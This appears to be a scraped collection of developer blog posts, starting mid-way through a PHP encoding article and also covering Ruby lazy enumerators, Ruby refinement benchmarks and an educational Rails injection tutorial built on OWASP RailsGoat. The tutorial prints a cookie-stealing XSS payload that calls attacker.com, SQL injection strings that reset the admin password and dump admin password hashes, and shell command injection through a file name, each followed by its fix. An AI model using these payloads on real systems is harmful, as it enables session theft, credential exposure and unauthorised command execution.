eucjp-win, sjis-win, then convert str to UTF-8 $string = mb_convert_encoding ( $str , \"UTF-8\" , \"JIS, eucjp-win, sjis-win\" ); We also have another function in PHP called iconv , but since it depends on the underlying implementation, using mb_convert_encoding is more reliable and consistent. Checking that we have the right encoding Before processing or storing any input, it is a good idea to check that we have the string in the right encoding. To achieve this, we can use mb_check_encoding , and it'll return true or false. For example, to check that a string is in UTF-8: mb_check_encoding ( $string , \"UTF-8\" ); Output in HTML Since it's so common to render some HTML code for a website from PHP, here's how we can make sure that we set the right encoding for the browser. We can do it just by sending a header before the output: header ( 'Content-Type: text/html; charset=utf-8' ); A note on databases Databases are an important part of handling encoding correctly since they are configured to use one for all the data we have there. In many cases, they're where we'll store all our strings and from where we'll read them to show them to the user. I recommend that you make sure that the encoding you're using for your project is also the same you have set in your database to prevent problems in the future. Setting your encoding for the database depends on the database system you use, so we can't describe every way in this article. However, it makes sense to go to the online docs and see how we can change it. For example, here's how to do it with PostgreSQL and with MySQL . Common encoding-related errors in PHP Malformed UTF-8 characters, possibly incorrectly encoded When transforming an array to JSON with json_encode , you might run into this issue. This just means that what PHP was expecting to get as UTF-8 is not in that encoding, so we can solve the problem by converting it first: $array [ 'name' ] = mb_convert_encoding ( $array [ 'name' ], 'UTF-8' , 'UTF-8' ); Encoding error in the database When reading from or writing to a database, you might run into some weird characters, such as the following: T�lÃ©awe This error is usually a sign that the encoding you're using to read your string is not the same one that the database is using. To fix this issue, make sure that you're checking the string's encoding before storing it and that you have set the right encoding in your database. Conclusion Encoding is sometimes difficult to understand, but hopefully, with this article, it's a bit clearer, and you feel more prepared to fix any errors that might come your way. The most important lesson to take away is to always remember that all strings have an associated encoding, so make sure you're using the right one from the first time you encounter it, and use the same encoding in your whole project, including the database and source files. If you need to pick one, pick a modern and common one, such as UTF-8, since it will serve you well with any new characters that might appear in the future, and it's very well designed.", "date": "2021-05-17"},
{"website": "Honey-Badger", "title": "Using lazy enumerators to work with large files in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/using-lazy-enumerators-to-work-with-large-files-in-ruby/", "abstract": "Enumerators are at the heart of what makes Ruby such a powerful, dynamic language. And lazy enumerators take this a step further by allowing you to efficiently work with extremely large collections. Files - it turns out - are just large collections of lines or characters. So lazy enumerators make it possible to to some very interesting and powerful things with them. What is an Enumerator anyway? Every time you use a method like each , you create an enumerator. This is the reason that you can chain together methods like [1,2,3].map { ... }.reduce { ... } . You can see what I mean in the example below. Calling each returns an enumerator, which I can use to do other iterative operations. # I swiped this code from Ruby's documentation http://ruby-doc.org/core-2.2.0/Enumerator.html enumerator = %w(one two three) . each puts enumerator . class # => Enumerator enumerator . each_with_object ( \"foo\" ) do | item , obj | puts \" #{ obj } : #{ item } \" end # foo: one # foo: two # foo: three Lazy enumerators are for large collections Normal enumerators have problems with large collections. The reason is that each method you call wants to iterate over the whole collection. You can see this for yourself by running the following code: # This code will \"hang\" and you'll have to ctrl-c to exit ( 1 .. Float :: INFINITY ). reject { | i | i . odd? }. map { | i | i * i }. first ( 5 ) The reject method runs forever, because it can never finish iterating over an infinite collection. But with a small addition, the code runs perfectly.  If I simply call the lazy method, Ruby does the smart thing and only does as many iterations as necessary for the computation. That's only 10 rows in this case, which is significantly smaller than infinity. ( 1 .. Float :: INFINITY ). lazy . reject { | i | i . odd? }. map { | i | i * i }. first ( 5 ) #=> [4, 16, 36, 64, 100] Six thousand copies of Moby Dick To test out these file tricks, we'll need a big file. One so large that any \"failure to be lazy\" will be obvious. I downloaded Moby Dick from Project Gutenberg, and then made a text file containing 100 copies. That wasn't big enough, though. So I upped it to about 6,000. That means that right now I'm probably the only guy in the world who has a text file containing 6,000 copies of Moby Dick. It's kind of humbling. But I digress. I downloaded moby dick and duplicated it several thousand times to get a large file to play with. The syntax isn't bash. It's fish shell. I think I'm the only one left who uses it. How to get enumerators for a file Here's a cool Ruby trick that you've probably used, even if you didn't know you were using it. Almost any method in Ruby that iterates over a collection will return an Enumerator object to you if you call it without passing in a block. What does that mean? Consider this example. I can open a file, and use each line to print out each line. But if I call it without a block, I get an enumerator. The methods of interest are each_line , each_char and each_codepoint . File . open ( \"moby.txt\" ) do | f | # Print out each line in the file f . each_line do | l | puts l end # Also prints out each line in the file. But it does it # by calling `each` on the Enumerator returned by `each_line` f . each_line . each do | l | puts l end end These two examples look almost identical, but the second one holds the key to unlocking AMAZING POWERS . Using a file's enumerator Once you have an enumerator that \"contains\" all of the lines in a file, you can slice and dice those lines just like you can with any ruby array. Here are just a few examples. file . each_line . each_with_index . map { | line , i | \"Line #{ i } : #{ line } \" }[ 3 , 10 ] file . each_line . select { | line | line . size == 9 }. first ( 10 ) file . each_line . reject { | line | line . match /whale/i } This is really cool, but these examples all have one big problem. They all load the entire file into memory before iterating over it. For a file containing 6,000 copies of Moby Dick, the lag is noticeable. Lazy-loading the lines of the file If we're scanning a large text file for the first 10 instances of the word \"whale\" then there's really no need to keep looking after the 10th occurrence. Fortunately it's dead easy to tell Ruby's enumerators to do this. You just use the \"lazy\" keyword. In the examples below, we take advantage of lazy loading to do some pretty sophisticated things. File . open ( \"moby.txt\" ) do | f | # Get the first 3 lines with the word \"whale\" f . each_line . lazy . select { | line | line . match ( /whale/i ) }. first ( 3 ) # Go back to the beginning of the file. f . rewind # Prepend the line number to the first three lines f . each_line . lazy . each_with_index . map do | line , i | \"LINE #{ i } : #{ line } \" end . first ( 3 ) f . rewind # Get the first three lines containing \"whale\" along with their line numbers f . each_line . lazy . each_with_index . map { | line , i | \"LINE #{ i } : #{ line } \" }. select { | line | line . match ( /whale/i ) }. first ( 3 ) end It's not just for files Sockets, pipes, serial ports - they're represented in Ruby using the IO class. That means that they all have each_line , each_char and each_codepoint methods. So you can use this trick for all of them. Pretty neat! It's not magic Unfortunately, lazy enumerators only speed things up if task you're trying to accomplish doesn't require that the entire file be read. If you're searching for a word that only occurs on the last page of the book, you have to read the whole book to find it. But in that case this approach shouldn't be any slower than a non-enumerator approach.", "date": "2015-08-10"},
{"website": "Honey-Badger", "title": "Rails Security Threats: Injections", "author": ["Diogo Souza"], "link": "https://www.honeybadger.io/blog/rails-security-injections/", "abstract": "If you deal with user data, you need to make sure that it's secure. However, if you're new to security, it can seem tricky, boring, and complicated. This article is the first in a series that will teach you about common types of security vulnerabilities and how they affect Rails development. We'll use the OWASP Top 10 Web Application Security Risks as our map through this terrain. OWASP stands for Open Web Application Security Project. It's a group of experts who work to educate the world about critical security issues on the web. Their Top 10 list enumerates the most common vulnerabilities in web applications: Injection Broken authentication Sensitive data exposure XML external entities (XXE) Broken access control Security misconfigurations Cross-site scripting (XSS) Insecure deserialization Using components with known vulnerabilities Insufficient logging and monitoring Although they update the list regularly, it changes less than you might expect. New technologies inherit old problems. In this piece, specifically, we'll cover three topics related to injection: JavaScript Injection - when applications accept malicious data from their clients, don't validate/sanitize the data, and send it back to the browser. SQL Injection - when pieces of SQL are intentionally sent as part of a database query to an unsafe SQL interpreter, tricking the interpreter into running dangerous commands or accessing sensitive information. OS Injection - when attackers aim to run system commands on unprotected applications that input data from system commands. We'll go from theory to practice to completely demonstrate how each one of them works. So, let's dive in! Injection Threats If you manage a source of data in your application, then you have a possible injection vector within it. When it comes to creative and innovative ways to hack your apps, hackers continue to invent new stuff that would surprise you. Let's start with the world of the injection's attacks. If you think your app is sanitized and protected, think again. JavaScript Injections JavaScript injections, commonly known as cross-site scripting (XSS), are all about tricking the backend application (which the client trusts) to send malicious data and/or scripts back to the browser. When this happens, attackers can run scripts in the user's browser to steal its session, ask for sensitive information \"in the name of\" the application, or redirect users to dangerous websites. Let's take the famous blog comment section as an example. Imagine that your application is completely vulnerable and receives a POST for a new comment in your blog, and the value goes directly to the database with no sanitization: POST http://myblog.com/comments\ndata: <script>window.location = 'http://attacker.com?cookie=' +document.cookie</script> When your website reloads the comment section, it'll fetch the new comment, which will execute the given script on the browser. The script, which runs within the application page (totally acceptable), gets a user's cookie information and sends it directly to the attacker's site. SQL Injections SQL injections happen when an application that deals with a SQL database does not securely sanitize the user's input whenever this input is concatenated (or interpolated) to any of your queries. There are two main threats involving SQL injection that you may be aware of in the Rails world: injection concatenation and interpolation . Let's check out the differences. SQL injection concatenation is the most famous; it happens when the attacker sends pieces of dangerous SQL as part of the HTTP query params or request body. It's a trick that works with most databases if your application layers are unable to identify this type of content and sanitize it. As an example, imagine that you're querying a user by his or her username to retrieve sensitive information: User . where ( \"name = ' #{ userName } '\" ) Considering that userName is non-sanitized user input, an attacker could change the param's value to ' OR ' 1 '=' 1 ' -- Consequently, your query will be transformed into this: SELECT * FROM users WHERE username = '' OR '1' = '1' ; Since the latest added condition always equals true , this query would always be executed, exposing hundreds of pieces of sensitive data from your users. SQL interpolation can lead to injection. How? Do you recall the scoping feature of Rails' ActiveRecord ? It allows us to specify queries that you use a lot to be referenced as method calls (such as where , joins , and includes ) on association objects or models. Take this example: class User < ApplicationRecord scope :filtered_name , -> { where ( name: interpolated_string ) } end You may have guessed the rest. If there's a where clause so that a developer can concatenate non-sanitized input values, it will lead, well, to pretty much the same SQL injection in the previous example. OS Injections OS injections happen when an application allows users to input system-level commands and doesn't filter them. The consequences could be very dangerous since the attacker will have a free tunnel to the OS in which the application is running. Depending on how the OS base security layers are set, it could expose data and files from other applications running there as well. Whenever you see one of the following code lines in Rails codebases, be aware that an OS injection could happen there: %x[...]\nsystem () exec () ` my command ` // the backticks Consider the following Rails implementation: new_path = \"/root/public/images/ #{ some_path } \" system ( \"ls #{ new_path } \" ) Given that some_path is coming from the client, an attacker could send the value as follows: some_path = 'some/path; cat ./config/database.yml' You got it, right? All the database data, including the credentials (if they aren't safely stored in a config cloud), will be exposed to the attacker. The RailsGoat Project To save some time and avoid having to develop a bunch of vulnerable examples from scratch, luckily, we have the RailsGoat project. It is one of the myriad open-source projects (754 projects) provided by the official OWASP GitHub repository, created for Rails with most of the Top 10 vulnerabilities purposefully programmed to educate developers on security threats. In this series, we'll make use of the project samples to explore the risks a bit deeper and, even better, in action! Setup Before you go any further, this project has some required dependencies: Ruby, Git, MySQL, and Postgres. Make sure to have all of them installed on your machine before proceeding any further. To set up the project, first, clone it locally: git clone https://github.com/OWASP/railsgoat.git It is targeted by default in Ruby 2.6.5, so make sure to install the proper version if you still don't have it: rvm install \"ruby-2.6.5\" Next, issue the following commands in the app root folder: bundle install rails db:setup\nrails s They will download and install the Rails project dependencies, set up the database, and start the Rails server, respectively. A Few Adjustments Depending on your OS, and because the RailsGoat is a bit outdated (the latest release was on Mar 2018), the install command may generate some errors. If you're on Mac, for example, and face the following error at your console: Console error about libv8 then, simply install the required gem: gem install libv8 -v '3.16.14.19' -- --with-system-v8 Another one that it'll probably blame is therubyracer gem due to a bug involving this version of Ruby's libv8 . Make sure to run the following commands: brew install v8-315\ngem install therubyracer -v '0.12.3' -- --with-v8-dir = /usr/local/opt/v8@3.15 By default, the current settings will consider SQLite the default database. For the next examples, however, we'll need a real database. We'll use MySQL. First, open the file config/database.yml, locate the mysql node, and change the configs according to your MySQL credentials. You can leave the database name as it is. Stop the Rails server, and make sure to have MySQL up and running; then, run the following commands: #Create the MySQL database RAILS_ENV = mysql rails db:create #Run the migrations against the database RAILS_ENV = mysql rails db:migrate #Seeds the database with initial records RAILS_ENV = mysql rails db:seed #Boot Rails using MySQl RAILS_ENV = mysql rails s Alternatively, you can start RailsGoat through Docker . It's up to you! That's it! Now, you can open the browser and log in to the RailsGoat app. You may find the auto-generated credentials available at the topbar's button \"Tutorial Credentials\". Pick one, but make sure that it's not the admin user. MetaCorp Rails application HTTP Proxy Setup Hackers work by sniffing around in stuff, mainly HTTP requests and responses. They make use of HTTP proxy applications that run between the browser and the server by intercepting, visualizing, and modifying the requests and responses. For this series, we'll need one of these too, and the perfect tool for the job is Burp . It is an enterprise paid-tool, but the free community version is more than adequate for our purposes. So, go ahead, download and install it by following the official instructions . Remember that Burp is made with Java, so you'll also need to have Java installed. Make sure to follow up on these instructions to get it working correctly. Once the tool is open, go to the Proxy > Intercept tab, toggle the button \" Intercept is on \" and then \" Open Browser \". This will open a Google Chromium directly connected to Burp and allow us to sniff the requests/responses. Type something there and check out how Burp tracks things out. Threats in Action Let's see now how each one of the threats we've discussed earlier takes place in real-world scenarios. We'll Start with JavaScript injections. JavaScript Injections in Action In the RailsGoat app, open the _header.html.erb file located in the views/layouts/shared folder. You may encounter the following HTML snippet: <li style= \"color: #FFFFFF\" > Welcome, < %= current_user.first_name.html_safe % ></li> Well, it turns out that this Rails method calls for a safe name, which is not. It tells whether the string is trusted as safe but doesn't sanitize user input. Make sure Burp isn't running, and then head to the registration page and type the following into the \"First Name\" field: < script > alert ( \" hello, XSS! \" ) < /script > Finish the registration and login with the newly created user. You may see the navigation bar displaying \"Welcome \" + the script code . How to Solve This This is a common misunderstanding. Developers commonly use this method, but it doesn't secure the data. Instead, you must use sanitize whenever you need to render HTML explicitly. In the example, just remove .html_safe , and the attack will be eliminated. A good tip would be to incorporate tools like SonarQube into your projects. These tools identify common threats like the one above and alert the developers about dangers and how to fix them. It's not a good idea to rely solely on the developer's memory. SQL Injection: A Concatenation Example Our RailsGoat SQL injection example resides within the users_controller.rb , inside of the app/controllers folder. Open it and review its contents. You may see two main methods to create and update user data within the database. Can you detect something wrong with our update method? Go, try it out! Here it goes: user = User . where ( \"id = ' #{ params [ :user ][ :id ] } '\" )[ 0 ] You know that it's not right to concatenate stuff in a where clause. But, let's test the hacking possibilities before fixing it. Go back to the running app on the Burp Chromium browser and navigate to the Account Settings menu: Accessing the account settings Once there, open the Burp tool and make sure the button \" Intercept is on \" is toggled. Then, fill in the password fields with some values and click Submit . Burp will intercept the request, and within the Params tab, you may see something similar to what's shown below. Burp Suite Tool - Params Tab Yes, all of your request params are visible here. They are not only visible but also editable. Burp will hold your request until you finish the edits and then release it to the server. You can do the same for your responses. Great, so, let's trick the application. Our goal is to update the password of the admin user rather than the current logged-in user. First, you need to remove the user's email , first_name , and last_name params because we don't aim to change these values for the admin user. Second, you may edit the user[id] param value to the following: 0 ') OR admin = true -- ' What's going on here? The above-exhibited value 6 refers to the current logged user id. However, we don't want to change anything related to this user, just the admin. The zero relates to nobody, which is good since the condition after the OR is the one that matters to us. Considering that we don't know the admin's id (well, if you know, it would save some time), we have to trick the database into selecting it via the admin role column. Once you finish the editing, click the Forward button so that the request gets released, and the admin's password is updated. This is the SQL Rails will generate: SELECT `users` . * FROM `users` WHERE ( id = '0' ) OR admin = true -- '') Now, go ahead and log into the admin account with your new password. How To Solve This There are some secure ways to solve this. You could always retrieve the user from the database before it's updated, regardless of what's coming from the client requests. However, it depends on the developer's coding style, which is not always guaranteed. So, it’s parameterized database queries to the rescue! Let’s see: user = User . where ( \"id = ?\" , params [ :user ][ :id ])[ 0 ] It's as simple as that! No more hacking. SQL Injection: An Interpolation Example In RailsGoat, each request is stored in the database as an auditing feature. For this example, let's analyze the analytics.rb class, which stores a scope called hits_by_ip . This is an admin feature that lists the request data from the database. Take a look at how this model interpolates strings within its scope: scope :hits_by_ip , -> ( ip , col = \"*\" ) { select ( \" #{ col } \" ). where ( ip_address: ip ). order ( \"id DESC\" ) } However, this approach is dangerous! Let's see why. Since you're logged in as an ordinary user, some menus won't show up, but it doesn't mean their endpoints aren't available. So, go ahead and access the http://localhost:3000/admin/1/analytics address. Since we're working at the localhost level, you'll only find data under the 127.0.0.1 IP. However, in production, you would search for your client IP. So, type 127.0.0.1 into the \" Search by IP \" textbox and hit enter. Don't forget to turn on the intercept button on your Burp tool. Once you're on the Params tab, you may click the Add button to add a new param of URL type and give it the following name: field[(select+group_concat(password)+from+users+where+admin=true)] Since the scope receives an interpolated string, you can simply add as many rules to the select query as you want. This query, specifically, will turn into this: SELECT ( select group_concat ( password ) from users where admin = true ) FROM analytics WHERE ip_address = \"127.0.0.1\" ORDER BY id DESC ; It means that we're retrieving the admin hashed password from the database and exhibiting it directly in our view: Querying for admin's hashed password How To Solve This? First of all, make sure that your users will only have access to what they must access. Such endpoints shouldn't be accessible or unprotected. As another preventive approach, you could whitelist the values that should be accepted and restrict those that should not. Take a look at the parse_field method within the same model class. It verifies whether the given field is included within the whitelist array. So, before calling the model's scope, you may iterate over the params and check whether they're fine to go. Let's do it by updating line 18 of the admin_controller.rb (which calls the scope): fields = params [ :field ]. map { | k , v | Analytics . parse_field ( k ) }. join ( \",\" ) OS Injections in Action Let's explore an example of OS injection within RailsGoat. Open the benefits.rb model under the app/models folder and check out its make_backup method. This method creates a backup copy of a file that is being uploaded via the “ Benefit Forms ” section of the application. There doesn’t seem to be a problem here, except that the method makes use of a system command: silence_streams ( STDERR ) { system ( \"cp #{ full_file_name } #{ data_path } /bak #{ Time . zone . now . to_i } _ #{ file . original_filename } \" ) } It seems correct at first sight, but look again. We can perfectly append other system commands from the user input, and they'll run just fine, such as the creation of a file. Wait, this is a file uploading feature; how can we update the input of a file? Let's see it in action. Go back to the RailsGoat app, click the \"Benefit Forms\" menu, choose a file of your preference, and turn on your Burp intercept button. Then, click Start Upload . When the request gets intercepted, you'll be able to see its header contents, as shown below. File uploading intercepted In the image, you can see two highlighted params: benefits[backup] and benefits[upload] . We need to change the first one's value to true since we want to activate the flow that makes a backup of the file and, therefore, where the vulnerability exists. Next, change the filename property of your second param to the following: filename=\"kid-2.png;+touch+abc.txt\" Then, release the intercept button. This will translate into a new command at the end of execution, which creates a new file called abc.txt . In addition to being simple, this is a good example of how vulnerable your flow may be and whether it's a perfect playground for hackers. Protecting against OS injections It may seem a bit obvious; why is someone copying a file through command systems? You'd be shocked by the number of legacy applications running out there. A lot of them are composed of enormous codebases, which can turn the job of detecting such vulnerabilities into a herculean task. So, yes, just make use of the official inner libraries, like Ruby’s FileUtils : FileUtils . cp \" #{ full_file_name } \" , \" #{ data_path } /bak #{ Time . zone . now . to_i } _ #{ file . original_filename } \" Wrapping Up Today, we navigated through the turbulent waters of injection security threats. Although this piece doesn't cover all the correlated problems surrounding injection issues, it explores the most famous ones, as identified by OWASP. As a bonus, I'll provide some important links that will help improve your knowledge of the subject. The first one, of course, is the OWASP Top Ten article ; it has lots of external links to other articles that include examples and different scenarios. Rails SQL Injection is compiled documentation curated by some members of the community that addresses common SQL injections through practical examples. It's a must-read after what we've covered so far. Last but not least, there are official Security Rails docs available. They cover everything regarding security within Rails applications, including injections. So, make sure to give it a thorough read. Continue your studies, and we’ll see you at our next stop!", "date": "2021-05-17"},
{"website": "Honey-Badger", "title": "The Honeybadger Developer Blog", "author": "Unknown", "link": "https://www.honeybadger.io/blog/", "abstract": "", "date": "2021-05-24"},
{"website": "Honey-Badger", "title": "Benchmarking Ruby Refinements", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/benchmarking-ruby-refinements/", "abstract": "If you search Google for Ruby refinements without knowing any of the back story you might come away with the idea that refinements are slow. As they were originally proposed, refinements would have been slow. They would have made it impossible for the interpreter to optimize things like method lookup. But the actual implementation of refinements is a bit more limited than the original proposal. So I thought it would be interesting to run a series of benchmarks on refinements as exist in Ruby today. TL;DR Refinements aren't slow. Or at least they don't seem to be any slower than \"normal\" methods. The dummy load We're going to be benchmarking method calls. So we'll need a few methods. Here, I'm creating two versions of a silly little method. One is \"normal\" and the other is inside of a refinement: # As our \"dummy load\" we're going to create shrugs. # 1 shrug == \"¯\\_(ツ)_/¯\" # 2 shrugs == \"¯\\_(ツ)_/¯¯\\_(ツ)_/¯\" # ...etc. SHRUG = \"¯ \\_ (ツ)_/¯\" # We'll make a refinement that generates shrugs module Shruggable refine Fixnum do def shrugs SHRUG * self end end end # ...and we'll make a normal method that also generates shrugs def integer_to_shrugs ( n ) SHRUG * n end We can't use the refinement directly. It has to be activated via a using statement. So I'll create two classes that behave identically. One uses the refinement, and the other doesn't. class TestUsing using Shruggable def noop end def shrug 10 . shrugs end end class TestWithoutUsing def noop end def shrug integer_to_shrugs ( 10 ) end end The benchmarks I wanted to know if it was any slower to instantiate objects using refinements, or to call methods added via refinements. All benchmarks were run with MRI 2.2.2 on OSX El Capitan. Object creation Does the \"using\" keyword make a class slower to initialize? Nope. Benchmark . ips do | bm | bm . report ( \"class initialization\" ) { TestUsing . new } bm . report ( \"class initialization WITH using\" ) { TestWithoutUsing . new } bm . compare! end # Calculating ------------------------------------- # class initialization   142.929k i/100ms # class initialization WITH using #                        145.323k i/100ms # ------------------------------------------------- # class initialization      5.564M (± 8.3%) i/s -     27.728M # class initialization WITH using #                           5.619M (± 7.4%) i/s -     28.047M # Comparison: # class initialization WITH using:  5618601.3 i/s # class initialization:  5564116.5 i/s - 1.01x slower Method calls Do refinements affect \"normal\" method lookup speed? Nope. Benchmark . ips do | bm | bm . report ( \"run method\" ) { TestUsing . new . noop } bm . report ( \"run method in class WITH using\" ) { TestWithoutUsing . new . noop } bm . compare! end # Calculating ------------------------------------- #           run method   141.905k i/100ms # run method in class WITH using #                        144.435k i/100ms # ------------------------------------------------- #           run method      5.010M (± 6.4%) i/s -     24.975M # run method in class WITH using #                           5.086M (± 5.3%) i/s -     25.421M # Comparison: # run method in class WITH using:  5086262.3 i/s #           run method:  5010273.6 i/s - 1.02x slower Is using a method from a refinement slower than using an equivalent \"normal\" method? Nope. Benchmark . ips do | bm | bm . report ( \"shrug\" ) { TestUsing . new . shrug } bm . report ( \"shrug via refinement\" ) { TestWithoutUsing . new . shrug } bm . compare! end # Calculating ------------------------------------- #                shrug    96.089k i/100ms # shrug via refinement    95.559k i/100ms # ------------------------------------------------- #                shrug      1.825M (± 9.3%) i/s -      9.128M # shrug via refinement      1.929M (± 6.2%) i/s -      9.651M # Comparison: # shrug via refinement:  1928841.5 i/s #                shrug:  1825069.4 i/s - 1.06x slower Stacking the deck Can I do anything to make a refinement benchmark slower than my control? ¯\\_(ツ)_/¯ # Does repeated evaluation of the `using` keyword affect performance. Only slightly. # This is an unfair test, but I really wanted to force refinements to be slower # in SOME use case :) Benchmark . ips do | bm | bm . report ( \"inline shrug\" ) { integer_to_shrugs ( 10 ) } bm . report ( \"inline shrug via refinement\" ) do using Shruggable 10 . shrugs end bm . compare! end # Calculating ------------------------------------- #         inline shrug   100.460k i/100ms # inline shrug via refinement #                         72.131k i/100ms # ------------------------------------------------- #         inline shrug      2.507M (± 5.2%) i/s -     12.557M # inline shrug via refinement #                           1.498M (± 4.3%) i/s -      7.502M # Comparison: #         inline shrug:  2506663.9 i/s # inline shrug via refinement:  1497747.6 i/s - 1.67x slower The full code If you'd like to run the benchmark yourself, here's the code. require 'benchmark/ips' # As our \"dummy load\" we're going to create shrugs. # 1 shrug == \"¯\\_(ツ)_/¯\" # 2 shrugs == \"¯\\_(ツ)_/¯¯\\_(ツ)_/¯\" # ...etc. SHRUG = \"¯ \\_ (ツ)_/¯\" # We'll make a refinement that generates shrugs module Shruggable refine Fixnum do def shrugs SHRUG * self end end end # ...and we'll make a normal method that also generates shrugs def integer_to_shrugs ( n ) SHRUG * n end # Now we'll define two classes. The first uses refinments. The second doesn't. class TestUsing using Shruggable def noop end def shrug 10 . shrugs end end class TestWithoutUsing def noop end def shrug integer_to_shrugs ( 10 ) end end # Does the \"using\" keyword make a class slower to initialize? Nope. Benchmark . ips do | bm | bm . report ( \"class initialization\" ) { TestUsing . new } bm . report ( \"class initialization WITH using\" ) { TestWithoutUsing . new } bm . compare! end # Calculating ------------------------------------- # class initialization   142.929k i/100ms # class initialization WITH using #                        145.323k i/100ms # ------------------------------------------------- # class initialization      5.564M (± 8.3%) i/s -     27.728M # class initialization WITH using #                           5.619M (± 7.4%) i/s -     28.047M # Comparison: # class initialization WITH using:  5618601.3 i/s # class initialization:  5564116.5 i/s - 1.01x slower # Do refinements affect \"normal\" method lookup speed? Nope. Benchmark . ips do | bm | bm . report ( \"run method\" ) { TestUsing . new . noop } bm . report ( \"run method in class WITH using\" ) { TestWithoutUsing . new . noop } bm . compare! end # Calculating ------------------------------------- #           run method   141.905k i/100ms # run method in class WITH using #                        144.435k i/100ms # ------------------------------------------------- #           run method      5.010M (± 6.4%) i/s -     24.975M # run method in class WITH using #                           5.086M (± 5.3%) i/s -     25.421M # Comparison: # run method in class WITH using:  5086262.3 i/s #           run method:  5010273.6 i/s - 1.02x slower # Is using a method from a refinement slower than using an equivalent \"normal\" method? Nope. Benchmark . ips do | bm | bm . report ( \"shrug\" ) { TestUsing . new . shrug } bm . report ( \"shrug via refinement\" ) { TestWithoutUsing . new . shrug } bm . compare! end # Calculating ------------------------------------- #                shrug    96.089k i/100ms # shrug via refinement    95.559k i/100ms # ------------------------------------------------- #                shrug      1.825M (± 9.3%) i/s -      9.128M # shrug via refinement      1.929M (± 6.2%) i/s -      9.651M # Comparison: # shrug via refinement:  1928841.5 i/s #                shrug:  1825069.4 i/s - 1.06x slower # Does repeated evaluation of the `using` keyword affect performance. Only slightly. # This is an unfair test, but I really wanted to force refinements to be slower # in SOME use case :) Benchmark . ips do | bm | bm . report ( \"inline shrug\" ) { integer_to_shrugs ( 10 ) } bm . report ( \"inline shrug via refinement\" ) do using Shruggable 10 . shrugs end bm . compare! end # Calculating ------------------------------------- #         inline shrug   100.460k i/100ms # inline shrug via refinement #                         72.131k i/100ms # ------------------------------------------------- #         inline shrug      2.507M (± 5.2%) i/s -     12.557M # inline shrug via refinement #                           1.498M (± 4.3%) i/s -      7.502M # Comparison: #         inline shrug:  2506663.9 i/s # inline shrug via refinement:  1497747.6 i/s - 1.67x slower", "date": "2015-10-20"}
]